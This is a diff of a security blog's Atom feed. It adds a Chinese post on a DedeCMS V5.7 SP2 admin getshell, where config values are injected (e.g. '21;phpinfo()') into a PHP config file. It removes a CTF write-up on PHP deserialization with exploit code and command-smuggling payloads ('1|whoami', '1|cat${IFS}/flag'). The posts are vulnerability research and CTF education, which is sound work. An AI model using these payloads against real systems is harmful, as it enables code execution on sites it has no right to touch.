@@ -216,6 +216,49 @@
   </entry>
   
   <entry>
+    <title>某CMS V5.7 SP2 后台Getshell</title>
+    <link href="http://chybeta.github.io/2018/02/27/%E6%9F%90CMS-V5-7-SP2-%E5%90%8E%E5%8F%B0Getshell/"/>
+    <id>http://chybeta.github.io/2018/02/27/某CMS-V5-7-SP2-后台Getshell/</id>
+    <published>2018-02-27T04:36:21.000Z</published>
+    <updated>2018-02-27T04:41:05.715Z</updated>
+    
+    <content type="html"><![CDATA[<p>首发于:<a href="https://xianzhi.aliyun.com/forum/topic/2071" target="_blank" rel="external">阿里先知安全社区：某CMS V5.7 SP2 后台Getshell</a><br><a id="more"></a></p>
+<p>dede/sys_info.php中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//保存配置的改动</span></div><div class="line"><span class="keyword">if</span>($dopost==<span class="string">"save"</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($token))&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'No token found!'</span>;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(strcasecmp($token, $_SESSION[<span class="string">'token'</span>]) != <span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'Token mismatch!'</span>;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $k=&gt;$v)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"#^edit___#"</span>, $k))</div><div class="line">        &#123;</div><div class="line">            $v = cn_substrR($&#123;$k&#125;, <span class="number">1024</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        $k = preg_replace(<span class="string">"#^edit___#"</span>, <span class="string">""</span>, $k);</div><div class="line">        $dsql-&gt;ExecuteNoneQuery(<span class="string">"UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' "</span>);</div><div class="line">    &#125;</div><div class="line">    ReWriteConfig();</div><div class="line">    ShowMsg(<span class="string">"成功更改站点配置！"</span>, <span class="string">"sys_info.php"</span>);</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在选择更改配置后，通过<code>foreach($_POST as $k=&gt;$v)</code>接受参数，并且将参数内容写入了数据库，之后进入<code>ReWriteConfig();</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//更新配置函数</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReWriteConfig</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">global</span> $dsql,$configfile;</div><div class="line">    <span class="keyword">if</span>(!is_writeable($configfile))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"配置文件'&#123;$configfile&#125;'不支持写入，无法修改系统配置参数！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    $fp = fopen($configfile,<span class="string">'w'</span>);</div><div class="line">    flock($fp,<span class="number">3</span>);</div><div class="line">    fwrite($fp,<span class="string">"&lt;"</span>.<span class="string">"?php\r\n"</span>);</div><div class="line">    $dsql-&gt;SetQuery(<span class="string">"SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC "</span>);</div><div class="line">    $dsql-&gt;Execute();</div><div class="line">    <span class="keyword">while</span>($row = $dsql-&gt;GetArray())</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>($row[<span class="string">'type'</span>]==<span class="string">'number'</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>($row[<span class="string">'value'</span>]==<span class="string">''</span>) $row[<span class="string">'value'</span>] = <span class="number">0</span>;</div><div class="line">            fwrite($fp,<span class="string">"\$&#123;$row['varname']&#125; = "</span>.$row[<span class="string">'value'</span>].<span class="string">";\r\n"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            fwrite($fp,<span class="string">"\$&#123;$row['varname']&#125; = '"</span>.str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$row[<span class="string">'value'</span>]).<span class="string">"';\r\n"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    fwrite($fp,<span class="string">"?"</span>.<span class="string">"&gt;"</span>);</div><div class="line">    fclose($fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里的代码将前面插入数据库的数据直接取出，没有再做验证。在<code>while($row = $dsql-&gt;GetArray())</code>，有两个分支，当<code>$row[&#39;type&#39;]==&#39;number&#39;</code>时，会往文件中直接写入，其他情况下会进行一次<code>str_replace(&quot;&#39;&quot;,&#39;&#39;,$row[&#39;value&#39;])</code>将单引号替换掉。所以我们考虑使用第一个分支。</p>
+<p>比如使用参数<code>cfg_ftp_port</code>，它表示采用的ftp端口</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180227/1.png?raw=true" alt=""></p>
+<p>我们填入值为<code>21;phpinfo()</code>:</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180227/2.png?raw=true" alt=""></p>
+<p>Getshell：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180227/3.png?raw=true" alt=""></p>
+<p>查看配置文件 data/config.cache.inc.php</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180227/4.png?raw=true" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;首发于:&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/2071&quot;&gt;阿里先知安全社区：某CMS V5.7 SP2 后台Getshell&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="dedecms" scheme="http://chybeta.github.io/tags/dedecms/"/>
+    
+  </entry>
+  
+  <entry>
     <title>【struts2 命令/代码执行漏洞分析系列】S2-001</title>
     <link href="http://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/"/>
     <id>http://chybeta.github.io/2018/02/06/【struts2-命令-代码执行漏洞分析系列】S2-001/</id>
@@ -609,9 +652,9 @@ $output .= &quot;if ({$dec}) {\n&quot;;
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
   </entry>
   
@@ -931,9 +974,9 @@ $output .= &quot;if ({$dec}) {\n&quot;;
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
-    
       <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
     
   </entry>
   
@@ -1387,54 +1430,6 @@ $output .= &quot;if ({$dec}) {\n&quot;;
       <category term="Node.js" scheme="http://chybeta.github.io/tags/Node-js/"/>
     
       <category term="反序列化" scheme="http://chybeta.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2017年百越杯AWD-web-writeup</title>
-    <link href="http://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/"/>
-    <id>http://chybeta.github.io/2017/10/28/2017年百越杯AWD-web-writeup/</id>
-    <published>2017-10-28T01:03:50.000Z</published>
-    <updated>2017-10-31T23:15:34.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>再不更新博客就长草啦。<br>PHP反序列化漏洞。<br><a id="more"></a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上周五参加福建省百越杯比赛，第二名。这篇小记一下线下赛的web题目，就当时找的漏洞做个简要的说明。由于一些配置不太清楚，所以现在复现起来可能不太准确，望见谅。原环境是linux下的，这里暂时win复现。</p>
-<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>先看一下web源码的目录大概如下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/1.png?raw=true" alt=""></p>
-<p>在common文件下，有一个home.php，其源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</div><div class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</div><div class="line">        system(<span class="string">"ping -c 2 $host"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</div><div class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</div><div class="line">        <span class="keyword">return</span> $str;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line">&#125;</div><div class="line">$a=@$_POST[<span class="string">'a'</span>];</div><div class="line">@unserialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>首先有一个home类，然后通过post接受参数a，并对其进行反序列化。仔细观察home类，里面有几个方法。</p>
-<p><code>__construct</code>析构方法进行初始化操作，指定$method和$args。</p>
-<p><code>__destruct</code>析构方法在对象销毁时调用，其中使用了<a href="http://php.net/manual/en/function.call-user-func-array.php" target="_blank" rel="external">call_user_func_array()</a>，如果method中有ping，则会调用ping方法，其参数即为$args。</p>
-<p><code>ping</code>方法执行sysyem命令：<code>system(&quot;ping -c 2 $host&quot;);</code>，注意到$host参数，由前即home类实例的$args。</p>
-<p><code>waf</code>方法，将传入的字符串中的空格去掉。</p>
-<p><code>__wakeup</code>方法，在反序列化时会自动调用，其中实现的功能是将参数$args先经过mysql_escape_string()，然后去除两边空格（trim），调用waf方法去掉字符串中的空格。</p>
-<p>看到这里，思路就很明确啦。构造反序列化字符串，先经过<code>__wakeup</code>的过滤，在执行结束后利用<code>__destruct</code>调用ping方法，利用其中的system执行任意命令。</p>
-<p>exp如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;   </div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</div><div class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</div><div class="line">        system(<span class="string">"ping -c 2 $host"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</div><div class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</div><div class="line">        <span class="keyword">return</span> $str;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line">&#125;</div><div class="line"></div><div class="line">print_r(<span class="string">"New a chybeta :)&lt;/br&gt;"</span>);</div><div class="line">$chybeta = <span class="keyword">new</span> home(<span class="string">"ping"</span>,<span class="keyword">array</span>(<span class="string">"1|whoami"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"&lt;/br&gt;Get the serialize result:&lt;/br&gt;"</span>);</div><div class="line">$exp = serialize($chybeta);</div><div class="line">print_r($exp);</div><div class="line"></div><div class="line">print_r(<span class="string">"&lt;/br&gt;&lt;/br&gt;unserialize and pwn it&lt;/br&gt;"</span>);</div><div class="line">print_r(<span class="string">"exec: system(\"whoami\")&lt;/br&gt;The result:  "</span>);</div><div class="line">serialize($exp);</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/2.png?raw=true" alt=""></p>
-<p>直接复制打印出来的反序列化串去post参数给home.php，并不成功。原因是有一些不可见字符。对以上的exp进行小改动，将反序列话结果输出到文件中，再用十六进制编辑器打开。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents(<span class="string">"temp"</span>, $exp);</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/3.png?raw=true" alt=""><br>可以上发现有一些零字节需要补上，最后payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">访问 common/home.php</div><div class="line"></div><div class="line">POST:</div><div class="line">a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:8:&quot;1|whoami&quot;;&#125;&#125;</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/4.png?raw=true" alt=""></p>
-<p>接下来进一步利用，在比赛时，我们需要读取到放在根目录下的flag（/flag）。而waf方法过滤了空格，这额可以用linux下的特殊变量<code>\$\{IFS\}</code>来代替。所以如果要读取flag，修改exp.php，注意需要转义<code>$</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$chybeta = new home(&quot;ping&quot;,array(&quot;1|cat\$&#123;IFS&#125;/flag&quot;));</div></pre></td></tr></table></figure></p>
-<p>关于linux环境下的命令执行绕过waf的方法，不妨看看这个: <a href="https://github.com/CHYbeta/WAF-Bypass/blob/master/ming-ling-zhu-ru/rao-guo-fang-fa.md" target="_blank" rel="external">WAF-Bypass<br>:命令注入</a></p>
-<p>最后的payload即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">访问 common/home.php</div><div class="line"></div><div class="line">POST:</div><div class="line">a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:16:&quot;1|cat$&#123;IFS&#125;/flag</div></pre></td></tr></table></figure></p>
-<p>防御方法，直接将<code>@unserialize($a);</code>注释掉就行啦。</p>
-<p>关于PHP反序列化漏洞，可以看看另一篇文章：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">chybeta: 浅谈php反序列化漏洞</a></p>
-<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>比赛攻击是用的就是这个洞，应该还有其他漏洞，后面再进一步补上吧。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;再不更新博客就长草啦。&lt;br&gt;PHP反序列化漏洞。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
-    
-    
-      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
-    
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
     
   </entry>
   
